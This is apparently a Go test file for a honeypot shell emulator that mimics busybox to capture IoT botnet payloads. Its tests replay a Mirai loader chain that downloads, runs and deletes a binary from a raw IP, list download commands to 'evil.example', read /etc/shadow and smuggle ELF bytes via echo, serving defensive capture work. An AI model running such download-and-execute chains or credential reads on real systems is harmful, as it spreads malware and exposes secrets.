package shell_test

import (
	"bytes"
	"strings"
	"sync"
	"testing"

	"github.com/honeynet/node/internal/personality"
	"github.com/honeynet/node/internal/shell"
	"github.com/honeynet/node/internal/vfs"
)

// rw is a buffer pair standing in for a network channel.
type rw struct {
	in  *bytes.Reader
	out bytes.Buffer
	mu  sync.Mutex
}

func (c *rw) Read(p []byte) (int, error) { return c.in.Read(p) }
func (c *rw) Write(p []byte) (int, error) {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.out.Write(p)
}

type capture struct {
	commands  []shell.CommandEvent
	artifacts []shell.ArtifactEvent
	uploads   []shell.UploadEvent
}

func (c *capture) hooks() shell.Hooks {
	return shell.Hooks{
		OnCommand:  func(e shell.CommandEvent) { c.commands = append(c.commands, e) },
		OnArtifact: func(e shell.ArtifactEvent) { c.artifacts = append(c.artifacts, e) },
		OnUpload:   func(e shell.UploadEvent) { c.uploads = append(c.uploads, e) },
	}
}

func newShell(t *testing.T, seed, user string) (*shell.Shell, *rw, *capture, *personality.Personality) {
	t.Helper()
	p := personality.Derive(seed)
	fsys := vfs.New(p)
	conn := &rw{in: bytes.NewReader(nil)}
	cap := &capture{}
	sh := shell.New(p, fsys, conn, user, false, cap.hooks(), shell.DefaultLimits())
	return sh, conn, cap, p
}

// run executes a command line in exec mode and returns everything written back.
func run(t *testing.T, sh *shell.Shell, conn *rw, line string) string {
	t.Helper()
	conn.mu.Lock()
	conn.out.Reset()
	conn.mu.Unlock()
	if err := sh.RunExec(line); err != nil {
		t.Fatalf("RunExec(%q): %v", line, err)
	}
	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.out.String()
}

// TestBusyboxAppletProbe covers the single most important response in the whole
// emulator.
//
// Mirai and its descendants probe with `/bin/busybox <NONSENSE>` and read the
// reply. A real busybox answers "<applet>: applet not found". Anything else --
// notably bash's "command not found" -- tells the loader it is talking to an
// emulator, and it disconnects before disclosing its payload URL, which is the
// one artifact the platform most needs.
func TestBusyboxAppletProbe(t *testing.T) {
	sh, conn, _, _ := newShell(t, "test-node", "root")

	for _, probe := range []string{"ECCHI", "MIRAI", "KAMI", "HUAWEISALT"} {
		got := run(t, sh, conn, "/bin/busybox "+probe)
		want := probe + ": applet not found"
		if !strings.Contains(got, want) {
			t.Errorf("busybox %s: got %q, want it to contain %q", probe, got, want)
		}
		if strings.Contains(got, "command not found") {
			t.Errorf("busybox %s leaked a bash-style error: %q", probe, got)
		}
	}

	// A real applet must still dispatch.
	if got := run(t, sh, conn, "/bin/busybox echo hello"); !strings.Contains(got, "hello") {
		t.Errorf("busybox echo: got %q, want it to contain \"hello\"", got)
	}
}

// TestMiraiInfectionChain replays a representative loader sequence end to end
// and asserts both that the transcript stays plausible and that the payload
// infrastructure is captured.
func TestMiraiInfectionChain(t *testing.T) {
	sh, conn, cap, _ := newShell(t, "test-node", "root")

	chain := []string{
		"/bin/busybox ECCHI",
		"cat /proc/mounts",
		"cd /tmp",
		"wget http://185.244.25.171/bins/mirai.x86 -O dvrHelper",
		"chmod 777 dvrHelper",
		"./dvrHelper",
		"rm -rf dvrHelper",
		"history -c",
	}
	for _, line := range chain {
		run(t, sh, conn, line)
	}

	if len(cap.commands) != len(chain) {
		t.Fatalf("recorded %d commands, want %d", len(cap.commands), len(chain))
	}

	// The payload URL must be captured as an artifact reference.
	if len(cap.artifacts) != 1 {
		t.Fatalf("recorded %d artifacts, want 1: %+v", len(cap.artifacts), cap.artifacts)
	}
	a := cap.artifacts[0]
	if a.URL != "http://185.244.25.171/bins/mirai.x86" {
		t.Errorf("artifact URL = %q, want the payload URL", a.URL)
	}
	if a.ViaTool != "wget" {
		t.Errorf("artifact tool = %q, want \"wget\"", a.ViaTool)
	}

	// The working directory must have followed the cd, so the drop path is
	// recorded correctly.
	var chmodEvent shell.CommandEvent
	for _, c := range cap.commands {
		if len(c.Argv) > 0 && c.Argv[0] == "chmod" {
			chmodEvent = c
		}
	}
	if chmodEvent.Cwd != "/tmp" {
		t.Errorf("chmod recorded cwd = %q, want \"/tmp\"", chmodEvent.Cwd)
	}
}

// TestPersonalityConsistency checks that the values a scanner cross-references
// actually agree with each other. Disagreement between uname, /proc/cpuinfo and
// /etc/os-release is a cheaper tell than any single wrong value.
func TestPersonalityConsistency(t *testing.T) {
	sh, conn, _, p := newShell(t, "consistency-node", "root")

	uname := run(t, sh, conn, "uname -a")
	if !strings.Contains(uname, p.Hostname) {
		t.Errorf("uname -a missing hostname %q: %q", p.Hostname, uname)
	}
	if !strings.Contains(uname, p.KernelRel) {
		t.Errorf("uname -a missing kernel %q: %q", p.KernelRel, uname)
	}

	hostname := strings.TrimSpace(run(t, sh, conn, "hostname"))
	if hostname != p.Hostname {
		t.Errorf("hostname = %q, want %q", hostname, p.Hostname)
	}

	etcHostname := strings.TrimSpace(run(t, sh, conn, "cat /etc/hostname"))
	if etcHostname != p.Hostname {
		t.Errorf("/etc/hostname = %q, want %q", etcHostname, p.Hostname)
	}

	cpuinfo := run(t, sh, conn, "cat /proc/cpuinfo")
	if !strings.Contains(cpuinfo, p.CPUModel) {
		t.Errorf("/proc/cpuinfo missing model %q", p.CPUModel)
	}
	if got := strings.Count(cpuinfo, "processor\t:"); got != p.CPUCores {
		t.Errorf("/proc/cpuinfo lists %d processors, want %d", got, p.CPUCores)
	}

	nproc := strings.TrimSpace(run(t, sh, conn, "nproc"))
	if nproc != strings.TrimSpace(strings.Split(cpuinfo, "\n")[0][len("processor\t: "):]+"") &&
		nproc != itoa(p.CPUCores) {
		t.Errorf("nproc = %q, want %d", nproc, p.CPUCores)
	}

	osrel := run(t, sh, conn, "cat /etc/os-release")
	if !strings.Contains(osrel, p.Distro.PrettyName) {
		t.Errorf("/etc/os-release missing %q", p.Distro.PrettyName)
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b []byte
	for n > 0 {
		b = append([]byte{byte('0' + n%10)}, b...)
		n /= 10
	}
	return string(b)
}

// TestPrivilegeSeparation verifies that an unprivileged session gets denied
// where a real box would deny it. The denial is signal in its own right: it
// tells us the actor probed their privilege level.
func TestPrivilegeSeparation(t *testing.T) {
	sh, conn, _, _ := newShell(t, "priv-node", "www-data")

	if got := run(t, sh, conn, "cat /etc/shadow"); !strings.Contains(got, "Permission denied") {
		t.Errorf("unprivileged cat /etc/shadow = %q, want permission denied", got)
	}
	if got := run(t, sh, conn, "id"); strings.Contains(got, "uid=0") {
		t.Errorf("unprivileged id reported root: %q", got)
	}

	root, rootConn, _, _ := newShell(t, "priv-node", "root")
	if got := run(t, root, rootConn, "cat /etc/shadow"); strings.Contains(got, "Permission denied") {
		t.Errorf("root cat /etc/shadow was denied: %q", got)
	}
}

// TestEchoHexPayload covers the `echo -e '\xNN'` smuggling technique loaders
// use to write binaries through a text channel. Decoding it is what turns an
// obfuscated command line into recoverable bytes.
func TestEchoHexPayload(t *testing.T) {
	sh, conn, cap, _ := newShell(t, "echo-node", "root")

	run(t, sh, conn, `echo -ne '\x7f\x45\x4c\x46\x02\x01\x01' > /tmp/payload`)

	if len(cap.uploads) != 1 {
		t.Fatalf("recorded %d uploads, want 1", len(cap.uploads))
	}
	got := cap.uploads[0].Content
	want := []byte{0x7f, 'E', 'L', 'F', 0x02, 0x01, 0x01}
	if !bytes.Equal(got, want) {
		t.Errorf("decoded payload = %v, want %v", got, want)
	}
}

// TestPipelineAndChaining verifies the operators loaders actually use.
func TestPipelineAndChaining(t *testing.T) {
	sh, conn, _, _ := newShell(t, "pipe-node", "root")

	if got := run(t, sh, conn, "cat /etc/passwd | grep root | wc -l"); strings.TrimSpace(got) != "1" {
		t.Errorf("pipeline result = %q, want \"1\"", strings.TrimSpace(got))
	}

	if got := run(t, sh, conn, "false && echo unreachable"); strings.Contains(got, "unreachable") {
		t.Errorf("&& ran after failure: %q", got)
	}
	if got := run(t, sh, conn, "false || echo fallback"); !strings.Contains(got, "fallback") {
		t.Errorf("|| did not run after failure: %q", got)
	}
	if got := run(t, sh, conn, "echo one; echo two"); !strings.Contains(got, "one") || !strings.Contains(got, "two") {
		t.Errorf("; did not run both: %q", got)
	}
}

// TestBulkInputDetection checks the flag that separates pasted from typed
// input. It feeds the bot/human classifier downstream.
func TestBulkInputDetection(t *testing.T) {
	sh, conn, cap, _ := newShell(t, "timing-node", "root")
	run(t, sh, conn, "uname -a")

	if len(cap.commands) != 1 {
		t.Fatalf("recorded %d commands, want 1", len(cap.commands))
	}
	if !cap.commands[0].BulkInput {
		t.Error("exec-mode command not flagged as bulk input; it arrived in one string by definition")
	}
}

// TestWriteQuotaEnforced confirms a session cannot exhaust node memory.
func TestWriteQuotaEnforced(t *testing.T) {
	p := personality.Derive("quota-node")
	fsys := vfs.New(p)

	big := make([]byte, 8<<20)
	var lastErr error
	for i := 0; i < 8; i++ {
		lastErr = fsys.WriteFile("/tmp/big", big, 0o644, 0, 0)
		if lastErr != nil {
			break
		}
	}
	if lastErr == nil {
		t.Error("write quota never engaged; a dd loop could exhaust node memory")
	}
}

// TestURLExtraction covers the shapes payload URLs actually arrive in.
func TestURLExtraction(t *testing.T) {
	cases := []struct {
		argv []string
		want []string
	}{
		{[]string{"wget", "http://1.2.3.4/a.sh"}, []string{"http://1.2.3.4/a.sh"}},
		{[]string{"curl", "-o", "x", "https://evil.example/p"}, []string{"https://evil.example/p"}},
		{[]string{"tftp", "-g", "-r", "tftp://5.6.7.8/b"}, []string{"tftp://5.6.7.8/b"}},
		{[]string{"sh", "-c", "wget http://a/1;wget http://b/2"}, []string{"http://a/1", "http://b/2"}},
		{[]string{"echo", "no url here"}, nil},
	}
	for _, tc := range cases {
		got := shell.ExtractURLs(tc.argv)
		if len(got) != len(tc.want) {
			t.Errorf("ExtractURLs(%v) = %v, want %v", tc.argv, got, tc.want)
			continue
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Errorf("ExtractURLs(%v)[%d] = %q, want %q", tc.argv, i, got[i], tc.want[i])
			}
		}
	}
}
